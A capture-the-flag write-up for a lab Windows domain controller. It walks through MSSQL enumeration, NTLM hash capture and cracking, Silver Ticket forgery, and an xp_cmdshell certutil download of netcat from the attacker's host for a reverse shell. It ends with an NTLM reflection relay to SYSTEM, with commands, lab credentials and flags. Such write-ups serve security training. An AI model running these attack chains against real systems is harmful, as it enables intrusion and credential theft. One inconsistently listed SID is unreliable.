
## CTF Writeup: Signed

---
## Provided Credentials

```
scott:Sm230#C5NatH
```
## Reconnaissance

An initial scan revealed the following information about running services on the target system.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.242.173
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-05 10:39 -0500
Stats: 0:09:31 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 18.21% done; ETC: 11:31 (0:42:44 remaining)
Nmap scan report for 10.129.242.173
Host is up (0.015s latency).
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2022 16.00.1000.00; RTM
| ms-sql-info: 
|   10.129.242.173:1433: 
|     Version: 
|       name: Microsoft SQL Server 2022 RTM
|       number: 16.00.1000.00
|       Product: Microsoft SQL Server 2022
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-08-05T15:50:16+00:00; 0s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.242.173:1433: 
|     Target_Name: SIGNED
|     NetBIOS_Domain_Name: SIGNED
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: SIGNED.HTB
|     DNS_Computer_Name: DC01.SIGNED.HTB
|     DNS_Tree_Name: SIGNED.HTB
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Not valid before: 2026-08-05T15:35:28
|_Not valid after:  2056-08-05T15:35:28

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 661.77 seconds
```

We gained information about the FQDN, the domain itself and the Hostname of the target. Let's map them all to the target ip address in our local dns file.

```
echo "10.129.242.173 dc01.signed.htb signed.htb dc01" | tee -a /etc/hosts
```

Checked if we can authenticate as mssql. Only local auth worked, which means user scott isn't an domain user.

```
nxc mssql dc01.signed.htb -u scott -p 'Sm230#C5NatH' --local-auth
```

Checked if we can impersonate any users. But no result.

```
nxc mssql dc01.signed.htb -u scott -p 'Sm230#C5NatH' --local-auth -M enum_impersonate
```

Checked linked servers. DC01 seems linked, but this can't be true right? Since the target itself already is the Domain Controller.

```
nxc mssql dc01.signed.htb -u scott -p 'Sm230#C5NatH' --local-auth -M enum_links
```

Enumerated logins and identified an active "sa" user.

```
nxc mssql dc01.signed.htb -u scott -p 'Sm230#C5NatH' --local-auth -M enum_logins
```

Decided to connect to the target MSSQL Database & gained MSSQL Shell.

```
impacket-mssqlclient scott:'Sm230#C5NatH'@10.129.242.173
```

Tested if we already have command execution, but this wasn't the case unfortunately.

```
EXEC xp_cmdshell 'whoami';
```

Decided to perform an MITM Attack with xp_dirtree and successfully captured the NTLM Hash of the MSSQL Service Account!

Started up responder on my local machine for this.

```
responder -I tun0
```

Ran the following command in order to make an reverse connection my responder and captured the NTLM Hash of the Service Account. Stored it in an file on my local machine.

```
EXEC xp_dirtree '//10.10.15.9/fake_share/', 1, 0;
```

Cracked the NTLM Hash using John the Ripper & retrieved new credentials.

```
john sql_svc --wordlist=/usr/share/wordlists/rockyou.txt
```

```
mssqlsvc:purPLE9795!@
```

Authenticated against the MSSQL Database as an Domain User and gained MSSQL Shell.

```
impacket-mssqlclient mssqlsvc:'purPLE9795!@'@10.129.242.173 -windows-auth
```

Command Execution was still not possible directly, but executing xp_dirtree revealed that we now see the Root Directory. Which means we could technically enable xp_cmdshell!

This also didn't work unfortunately.

```
EXEC sp_configure 'show advanced options', '1';
```

Since we also can't impersonate anyone an command execution on linked servers doesn't work, let's try & perform an Silver Ticket Attack!

1. Get the NTLM Hash

Utilize the following website & paste the password of the sql_svc account inside.
This will generate an NTLM Hash for the password.

```
https://www.browserling.com/tools/ntlm-hash
```

NTLM Hash

```
EF699384C3285C54128A3EE1DDB1A0CC
```

2. Get SID of the Domain

But this didn't worked for me.

```
impacket-secretsdump -k signed.htb/mssqlsvc@dc01.signed.htb -no-pass -debug
```

I looked up and found another way. Utilized the following Query:

```
SELECT master.dbo.fn_varbintohexstr(SUSER_SID()) AS HexSID;
HexSID                                                       
----------------------------------------------------------   
0x0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
```

and created the following script (with AI) to get the proper SID.

```
import struct
import sys

hex_str = input("Paste the hex SID (with or without 0x): ").strip()
hex_str = hex_str.lower()

# Remove 0x prefix if present
if hex_str.startswith("0x"):
    hex_str = hex_str[2:]

# Remove any spaces or newlines
hex_str = hex_str.replace(" ", "").replace("\n", "")

try:
    sid_bytes = bytes.fromhex(hex_str)
except ValueError as e:
    print(f"[-] Invalid hex string: {e}")
    sys.exit(1)

# Basic SID structure check
if len(sid_bytes) < 8:
    print("[-] Too few bytes for a SID.")
    sys.exit(1)

rev = sid_bytes[0]
sub_count = sid_bytes[1]
auth = int.from_bytes(sid_bytes[2:8], byteorder='big')

# The total length must be 8 + 4*sub_count
expected_len = 8 + 4 * sub_count
if len(sid_bytes) != expected_len:
    print(f"[-] Mismatched SID length. Expected {expected_len} bytes, got {len(sid_bytes)}.")
    sys.exit(1)

# Build the list of all SID components
parts = [rev, auth]
for i in range(sub_count):
    offset = 8 + 4 * i
    sub = struct.unpack_from('<I', sid_bytes, offset)[0]
    parts.append(sub)

# Build domain SID by removing the last sub-authority (the RID)
if sub_count <= 1:
    # No sub-authorities left for domain SID (shouldn't happen with user SIDs)
    print("[-] SID has too few sub-authorities.")
    sys.exit(1)

domain_parts = parts[:-1]   # drop the last RID
domain_sid = "S-" + "-".join(str(p) for p in domain_parts)
print(f"[+] Domain SID: {domain_sid}")
```

Ran the script & retrieved the Domain SID!

```
python3 /opt/arsenal/sid_converter.py
Paste the hex SID (with or without 0x): 0105000000000005150000005b7bb0f398aa2245ad4a1ca44f040000
[+] Domain SID: S-1-5-21-4088429403-1159899800-2753317549
```

We need to append the -500 at the end and we gained the Domain SID

```
S-1-5-21-2743207045-1827831105-2542523200
```

4. Forge Silver Ticket

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 Administrator
```

This created and saved an Administrator.ccache ticket which enables us to connect via impacket-mssqlclient as Administrator!

5. Export it

```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

6. Connected to the target and gained MSSQL Shell

```
impacket-mssqlclient dc01.signed.htb -k -no-pass
```

We gained Administrator Shell, but it looks like the Administrator doesn't have the correct permissions on this box! Let's enumerate which users/groups have!

```
enum_logins
```

This revealed informations about an IT Group which seems to have Administrator Access, let's forge an Silver Ticket of this Group! We'll first need to get the SID again and the RID of the Group!

```
select SUSER_SID('Signed\IT')
```

I'll run the following script in order to get the SID & RID.

```
import struct

hex_str = input("Paste the hex SID (with or without 0x): ").strip().replace("0x", "").replace(" ", "")
sid_bytes = bytes.fromhex(hex_str)

rev = sid_bytes[0]
sub_count = sid_bytes[1]
auth = int.from_bytes(sid_bytes[2:8], 'big')

parts = [rev, auth]
for i in range(sub_count):
    sub = struct.unpack_from('<I', sid_bytes, 8 + 4*i)[0]
    parts.append(sub)

full_sid = "S-" + "-".join(str(p) for p in parts)
domain_sid = "S-" + "-".join(str(p) for p in parts[:-1])  # drop RID
rid = parts[-1]

print(f"Full SID: {full_sid}")
print(f"Domain SID: {domain_sid}")
print(f"RID: {rid}")
```

```
python3 /opt/arsenal/sid_converter.py 
Paste the hex SID (with or without 0x): 0105000000000005150000005b7bb0f398aa2245ad4a1ca451040000
Full SID: S-1-5-21-4088429403-1159899800-2753317549-1105
Domain SID: S-1-5-21-4088429403-1159899800-2753317549
RID: 1105
```

Forged Silver Ticket.

```
impacket-ticketer -nthash ef699384c3285c54128a3ee1ddb1a0cc -domain-sid S-1-5-21-4088429403-1159899800-2753317549 -domain signed.htb -spn MSSQLSvc/DC01.signed.htb:1433 -groups 1105 Administrator
```

Exported the silver ticket inside our kerberos cache.

```
export KRB5CCNAME=$(pwd)/Administrator.ccache
```

Connected to the Target System.

```
impacket-mssqlclient dc01.signed.htb -k -no-pass
```

Verified if we are admin now & yes we are!

```
SELECT IS_SRVROLEMEMBER('sysadmin');
-   
1   
```

Let's activate xp_cmdshell!

1. Step: Show advanced options (required)

```
EXEC sp_configure 'show advanced options', '1';
```

```
RECONFIGURE;
```

2. Step: Enable xp_cmdshell

```
EXEC sp_configure 'xp_cmdshell', '1';
```

```
RECONFIGURE;
```

3. Step: Verify it's enabled

```
EXEC sp_configure 'xp_cmdshell';
```

Verified if it worked and it did!

```
SQL (SIGNED\Administrator  dbo@master)> EXEC xp_cmdshell "whoami";
output            
---------------   
signed\mssqlsvc
```

Started an netcat listener on my local machine on port 53.

```
rlwrap nc -lvnp 53
```

Started up an python3 webserver inside the directory in which my nc.exe is stored.

```
python3 -m http.server 445
```

Transfered nc.exe onto the target server.

```
EXEC xp_cmdshell "certutil -urlcache -split -f http://10.10.15.9:445/nc.exe C:\Windows\Tasks\nc.exe";
```

Gained RCE.

```
rlwrap nc -lvnp 53    
listening on [any] 53 ...
connect to [10.10.15.9] from (UNKNOWN) [10.129.242.173] 54194
Microsoft Windows [Version 10.0.17763.7309]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved user.txt in C:\User\mssqlsvc\Desktop.

```
31bcec4ccf7406194ffd930863b55d50
```
## Privilege Escalation

Checked out the permissions & group my current user is in, but there seems to nothing relevant.

```
whoami /all
```

After some time I didn't find anything really interesting & decided to perform port forwarding using ligolo-ng, so we can access all servers. Especially the WinRMS looks promising.

On Local machine

1. Setting up Ligolo on Kali:

```
sudo ip tuntap add user saitama mode tun ligolo
```

```
sudo ip link set ligolo up
```

2. Start the proxy.

```
ligolo-proxy -selfcert
```

On Target Server

3. Target connect back to local machine.

```
agent.exe -connect 10.10.15.9:11601 -ignore-cert
```

4. Now on the Ligolo CLI on local machine:

Selected an agent

```
session
```

Started tunnel.

```
start
```

5. Then, add the magic Ligolo IP to the IP route table on Kali since we’re trying to access a localhost port.

```
sudo ip route add 240.0.0.1/32 dev ligolo
```

Verified if it worked. It did!

```
nxc smb 240.0.0.1 -u mssqlsvc -p 'purPLE9795!@' 
```

I had to look the privesc up:

Apparently we can abuse an NTLM Reflection Attack. In order to exploit this, we need:

Add an DNS Entry pointing back to us. This DNS Entry has to be made according to a very specific format, which is explained in great detail. Simply it has to be a hostname that resolves to the machine itself, prepended with a marshaled string.

Note: I also had to change the DNS Entry from dc01.signed.htb to 240.0.0.1.

```
<MACHINE NAME>+1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

Templates:

```
# localhost1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
# signed1UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA
```

To add the DNS entry, we can use the dnstools.py from krbrelayx 

```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'SIGNED.HTB\mssqlsvc' -p 'purPLE9795!@' -a add -r dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA -d 10.10.15.9 240.0.0.1
```

Then you need to start ntlmrelayx.py to relay the coerced authentication. But what are we
relaying it to? As of now, it is possible to relay to MSSQL , ESC8 , and WinRMS . Since we have WinRMS (5986), let's relay to that.

```
/usr/share/doc/python3-impacket/examples/ntlmrelayx.py -t winrms://240.0.0.1 -smb2support
```

Then, finally, we can coerce the target using the DNS entry we added. For that, we can use
NetExec 's coerce_plus module. (Subsequently, Petitpotam can also be used for this)

```
nxc smb dc01.signed.htb -u mssqlsvc -p 'purPLE9795!@' -M
coerce_plus -o L=dc011UWhRCAAAAAAAAAAAAAAAAAAAAAAAAAAAAwbEAYBAAAA M=Petit
```

Now we can access the WinRMS shell from the socks proxy at 127.0.0.1:11000 .

```
nc 127.0.0.1 11000                            
Type help for list of commands

# whoami
nt authority\system

#
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
a0476375037006dd82de3fdcdc12b9b5
```